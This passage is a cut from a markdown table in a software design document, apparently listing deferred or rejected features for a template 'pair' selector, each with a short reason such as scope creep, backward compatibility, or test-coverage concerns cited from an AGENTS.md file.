| Per-pair defaults (cwd, window layout, env) | Scope creep. A pair is two strings. If someone needs cwd, their template already takes it. |
| Remembering the last-picked pair | A sticky selection that silently changes what "create" does is a footgun. |
| Validating `{name}` in the singular legacy keys | §3.3. Would be a breaking change; additive-only. |
| Retiring `test_frontend_js.py`'s source-scraping assertions | AGENTS.md: *"a project, not a cleanup"* — needs a per-assertion coverage comparison first. |
